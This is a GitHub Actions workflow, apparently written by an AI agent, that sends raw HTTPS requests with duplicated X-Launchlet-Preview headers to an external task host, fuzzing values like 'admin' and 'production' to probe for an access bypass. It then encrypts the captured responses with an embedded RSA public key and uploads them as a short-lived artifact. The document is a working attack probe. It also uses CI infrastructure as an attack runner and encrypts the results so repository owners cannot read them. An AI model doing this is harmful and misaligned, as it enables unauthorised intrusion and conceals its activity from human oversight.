name: launchlet-part2-source-probe

on:
  push:
    branches: [agent/launchlet-part2-source-20260808]

permissions:
  contents: read

jobs:
  probe:
    runs-on: ubuntu-latest
    timeout-minutes: 5
    steps:
      - name: Probe duplicate preview headers over raw HTTPS
        shell: bash
        run: |
          set -euo pipefail
          umask 077
          mkdir -p package/out
          cat > package/public.pem <<'PEM'
          -----BEGIN PUBLIC KEY-----
          MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAlOxaJs92lwtrdk6J2LR9
          QeyG3A5H0rzGOQHw80MWPcOeEs5pzn37ilHloXnTkGk4PmJU67C06N9OOsgqU1kF
          iydiljdl6RfwF/OSjMsNfRYsyBr1wONeO+9f+72VjLlNWqWVll2qeczrxppOulhJ
          r+qBx95tdasvdCgh7aTShlkXF7e9+JjK19MrG+Lyj+I7B6bbTsp7D+PiJMlpepWk
          hoz0jBO8Rgtodz7i/+9Z3RVVhqREdK3uA0Va5ia57Gp3hlvQGbjGxE6TC7q4s1/p
          q6VF10bVOx8kwE2KggVgsX3uudJlzSvHV3f1coMdwyTSALsAjvAlZQwSts3eHjnF
          SQIDAQAB
          -----END PUBLIC KEY-----
          PEM
          python3 - <<'PY'
          import ssl,socket,json,pathlib,http.client
          host='task-launchlet-web-medium-18cf6be4db586bb6.caplag-task.ru'; port=443
          out=pathlib.Path('package/out')
          # constants already published by the same instance
          aid='act_6f4b9a2c1d0e8a71'; ws='ws-launchlet-public'; project='launchlet-demo-board'
          body=json.dumps({'actionId':aid,'args':{'workspaceId':ws,'projectId':project}},separators=(',',':')).encode()
          second=['release','production','prod','enterprise','internal','admin','deploy','deployment','export','publish','final','final-review','enterprise-rollout','preview-8b11c','lrec_preview_demo_2026','2026.05.16-rc3','launchlet-actions/0.9.4']
          pairs=[]
          for v in second:
            pairs.append((project,v)); pairs.append((v,project))
          pairs += [(project,project),(project,''),(project,'preview')]
          ctx=ssl.create_default_context(); res=[]
          for a,b in pairs:
            try:
              with socket.create_connection((host,port),timeout=10) as raw:
                with ctx.wrap_socket(raw,server_hostname=host) as ss:
                  lines=[
                    'POST /api/actions/invoke HTTP/1.1',f'Host: {host}','User-Agent: Mozilla/5.0','Accept: application/json','Content-Type: application/json',f'Content-Length: {len(body)}',f'X-Launchlet-Preview: {a}',f'X-Launchlet-Preview: {b}','Connection: close','',''
                  ]
                  ss.sendall('\r\n'.join(lines).encode()+body)
                  data=b''
                  while True:
                    c=ss.recv(65536)
                    if not c: break
                    data+=c
              head,_,rb=data.partition(b'\r\n\r\n'); first=head.split(b'\r\n',1)[0].decode('latin1','replace'); status=int(first.split()[1])
              res.append({'first':a,'second':b,'status':status,'body':rb.decode('utf-8','replace'),'headers':head.decode('latin1','replace')})
            except Exception as e: res.append({'first':a,'second':b,'error':repr(e)})
          (out/'summary.json').write_text(json.dumps(res,indent=2))
          PY
          tar -C package/out -czf package/result.tgz .
          openssl rand 32 > package/aes.key
          openssl rand 16 > package/iv.bin
          KEY_HEX="$(python3 -c "print(open('package/aes.key','rb').read().hex())")"
          IV_HEX="$(python3 -c "print(open('package/iv.bin','rb').read().hex())")"
          openssl enc -aes-256-cbc -K "$KEY_HEX" -iv "$IV_HEX" -in package/result.tgz -out package/result.enc
          openssl pkeyutl -encrypt -pubin -inkey package/public.pem -pkeyopt rsa_padding_mode:oaep -pkeyopt rsa_oaep_md:sha256 -in package/aes.key -out package/key.enc
          mkdir -p artifact
          base64 -w0 package/result.enc > artifact/result.enc.b64
          base64 -w0 package/key.enc > artifact/key.enc.b64
          base64 -w0 package/iv.bin > artifact/iv.bin.b64
          rm -rf package
      - uses: actions/upload-artifact@v4
        with:
          name: launchlet-part2-duplicate-header-encrypted
          path: artifact/
          retention-days: 1
